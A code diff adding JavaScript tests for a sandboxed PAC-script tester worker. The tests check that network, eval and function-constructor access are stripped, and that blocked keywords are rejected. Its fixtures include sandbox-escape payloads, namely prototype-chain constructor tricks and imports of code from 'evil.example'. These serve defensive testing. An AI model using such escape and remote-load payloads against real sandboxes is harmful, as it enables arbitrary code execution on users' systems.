@@ -136,3 +136,55 @@ test('pac-tester-worker.js: 腳本例外時回傳 ERROR 狀態且與 engine.ts �
   assert.equal(real.status, 'ERROR');
   assert.deepEqual(withoutExecutionTime(workerMsg.result), withoutExecutionTime(real));
 });
+
+const mockContextForSandbox = { clientIpv4: '192.168.1.100', clientIpv6: '2001:db8::100', dnsMap: {} };
+
+test('pac-tester-worker.js: 載入後移除網路、程式碼載入 API 並切斷函式建構子', () => {
+  const { sandbox } = createWorkerContext();
+  assert.equal(sandbox.fetch, undefined);
+  assert.equal(sandbox.importScripts, undefined);
+  assert.equal(sandbox.XMLHttpRequest, undefined);
+  assert.equal(vm.runInContext('typeof eval', sandbox), 'undefined');
+  assert.equal(vm.runInContext('typeof setTimeout', sandbox), 'undefined');
+  assert.equal(vm.runInContext('(function () {}).constructor', sandbox), undefined);
+  assert.equal(vm.runInContext('(async function () {}).constructor', sandbox), undefined);
+});
+
+test('pac-tester-worker.js: 以字串拼接繞過靜態檢查的原型鏈逃逸，在 Worker 中取不到函式建構子', () => {
+  const escapeScript = `function FindProxyForURL(url, host) {
+  var key = 'constr' + 'uctor';
+  var ctor = ({})[key][key];
+  return typeof ctor === 'function' ? 'PROXY escaped:1' : 'DIRECT';
+}`;
+  const workerMsg = runWorkerSingle(escapeScript, 'https://example.com', mockContextForSandbox);
+  assert.equal(workerMsg.result.returnString, 'DIRECT');
+});
+
+test('pac-tester-worker.js: 禁用關鍵字在執行前即拒絕，且與 engine.ts 一致', () => {
+  const scripts = [
+    'function FindProxyForURL(url, host) { importScripts("https://evil.example/x.js"); return "DIRECT"; }',
+    'function FindProxyForURL(url, host) { import("https://evil.example/x.js"); return "DIRECT"; }',
+    'function FindProxyForURL(url, host) { return ({}).constructor.constructor("return this")() ? "DIRECT" : "DIRECT"; }',
+    'function FindProxyForURL(url, host) { return eval("\'DIRECT\'"); }',
+    'function FindProxyForURL(url, host) { return self.fetch ? "DIRECT" : "DIRECT"; }',
+  ];
+  for (const script of scripts) {
+    const real = runSinglePacTest(script, 'https://example.com', mockContextForSandbox);
+    const workerMsg = runWorkerSingle(script, 'https://example.com', mockContextForSandbox);
+    assert.equal(real.status, 'ERROR', script);
+    assert.match(real.error, /禁止使用的關鍵字/, script);
+    assert.deepEqual(withoutExecutionTime(workerMsg.result), withoutExecutionTime(real), script);
+  }
+});
+
+test('pac-tester-worker.js: 字串與註解中的一般主機名稱不會被誤判為禁用關鍵字', () => {
+  const script = `// self-hosted proxy for prototype lab
+function FindProxyForURL(url, host) {
+  if (dnsDomainIs(host, "self.example.com")) return "PROXY constructor.example.com:8080";
+  return "DIRECT";
+}`;
+  const real = runSinglePacTest(script, 'https://self.example.com/', mockContextForSandbox);
+  const workerMsg = runWorkerSingle(script, 'https://self.example.com/', mockContextForSandbox);
+  assert.equal(real.returnString, 'PROXY constructor.example.com:8080');
+  assert.deepEqual(withoutExecutionTime(workerMsg.result), withoutExecutionTime(real));
+});
